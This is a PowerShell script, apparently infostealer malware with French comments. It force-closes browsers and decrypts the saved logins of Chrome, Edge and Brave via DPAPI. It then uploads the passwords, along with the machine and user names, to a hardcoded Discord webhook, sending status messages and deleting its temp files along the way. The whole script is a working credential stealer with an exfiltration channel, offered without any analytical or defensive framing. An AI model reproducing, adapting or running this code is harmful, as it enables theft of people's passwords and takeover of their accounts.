$wh="https://discord.com/api/webhooks/1467465390576766998/4_TcKXgnZalThMN2QWyUY3q-H_IPWFR_Y1C2YqXnVcM-G_cxPZeTatGBSkTtCIRr_yGX"

function Send-Discord {
    param([string]$msg)
    try {
        $Body = @{content=$msg} | ConvertTo-Json
        Invoke-RestMethod -Uri $wh -Method Post -Body $Body -ContentType 'application/json' | Out-Null
    } catch {}
}

Send-Discord "🟢 START - $env:COMPUTERNAME | $env:USERNAME"

# Tuer navigateurs
Get-Process chrome,msedge,firefox,brave,opera -EA 0 | Stop-Process -Force -EA 0
Start-Sleep 3

Send-Discord "🔓 Decrypting passwords..."

Add-Type -AssemblyName System.Security

function Get-DecryptedPassword {
    param([byte[]]$encryptedData)
    try {
        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $encryptedData,
            $null,
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        return [System.Text.Encoding]::UTF8.GetString($decrypted)
    } catch {
        return $null
    }
}

function Get-BrowserPasswords {
    param($browserName, $dbPath)
    
    if (!(Test-Path $dbPath)) { 
        Send-Discord "⚠️ $browserName DB not found"
        return @()
    }
    
    $tempDb = "$env:TEMP\logindata_$browserName"
    Copy-Item $dbPath $tempDb -Force -EA 0
    
    $results = @()
    
    try {
        # Utiliser System.Data.SQLite directement
        $assembly = [Reflection.Assembly]::LoadWithPartialName("System.Data.SQLite")
        
        if (!$assembly) {
            # Télécharger SQLite si absent
            $sqlitePath = "$env:TEMP\System.Data.SQLite.dll"
            if (!(Test-Path $sqlitePath)) {
                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
                Invoke-WebRequest "https://system.data.sqlite.org/blobs/1.0.118.0/sqlite-netFx46-binary-x64-2015-1.0.118.0.zip" -OutFile "$env:TEMP\sqlite.zip" -UseBasicParsing
                Expand-Archive "$env:TEMP\sqlite.zip" "$env:TEMP\sqlite" -Force
                Copy-Item "$env:TEMP\sqlite\System.Data.SQLite.dll" $sqlitePath -Force
            }
            [Reflection.Assembly]::LoadFile($sqlitePath) | Out-Null
        }
        
        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Version=3;")
        $conn.Open()
        
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''"
        
        $reader = $cmd.ExecuteReader()
        
        while ($reader.Read()) {
            $url = $reader.GetString(0)
            $username = $reader.GetString(1)
            
            if ($reader.IsDBNull(2)) { continue }
            
            $encPass = New-Object byte[] $reader.GetBytes(2, 0, $null, 0, 0)
            $reader.GetBytes(2, 0, $encPass, 0, $encPass.Length) | Out-Null
            
            $password = Get-DecryptedPassword -encryptedData $encPass
            
            if ($password) {
                $results += "[{0}]`nURL: {1}`nUser: {2}`nPass: {3}`n" -f $browserName, $url, $username, $password
            }
        }
        
        $reader.Close()
        $conn.Close()
        
    } catch {
        Send-Discord "❌ $browserName error: $($_.Exception.Message)"
    }
    
    Remove-Item $tempDb -Force -EA 0
    return $results
}

$allPasswords = @()

# Chrome
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$chromePasswords = Get-BrowserPasswords "CHROME" $chromePath
$allPasswords += $chromePasswords
if ($chromePasswords.Count -gt 0) {
    Send-Discord "✅ Chrome: $($chromePasswords.Count) passwords"
}

# Edge
$edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
$edgePasswords = Get-BrowserPasswords "EDGE" $edgePath
$allPasswords += $edgePasswords
if ($edgePasswords.Count -gt 0) {
    Send-Discord "✅ Edge: $($edgePasswords.Count) passwords"
}

# Brave
$bravePath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
$bravePasswords = Get-BrowserPasswords "BRAVE" $bravePath
$allPasswords += $bravePasswords
if ($bravePasswords.Count -gt 0) {
    Send-Discord "✅ Brave: $($bravePasswords.Count) passwords"
}

if ($allPasswords.Count -gt 0) {
    $outputFile = "$env:TEMP\decrypted_passwords.txt"
    
    "=== BROWSER PASSWORDS DECRYPTED ===`n" | Out-File $outputFile -Encoding UTF8
    "Computer: $env:COMPUTERNAME`n" | Out-File $outputFile -Append -Encoding UTF8
    "User: $env:USERNAME`n" | Out-File $outputFile -Append -Encoding UTF8
    "Date: $(Get-Date)`n`n" | Out-File $outputFile -Append -Encoding UTF8
    $allPasswords | Out-File $outputFile -Append -Encoding UTF8
    
    $size = [math]::Round((Get-Item $outputFile).Length / 1KB, 2)
    Send-Discord "📤 Uploading $size KB..."
    
    curl.exe -F "file=@$outputFile" -F "content=🔑 **$($allPasswords.Count) PASSWORDS DECRYPTED**`n**PC:** $env:COMPUTERNAME`n**User:** $env:USERNAME" $wh
    
    Remove-Item $outputFile -Force
    Send-Discord "✅ UPLOAD SUCCESS"
} else {
    Send-Discord "⚠️ No passwords found"
}

Send-Discord "🧹 FINISHED"
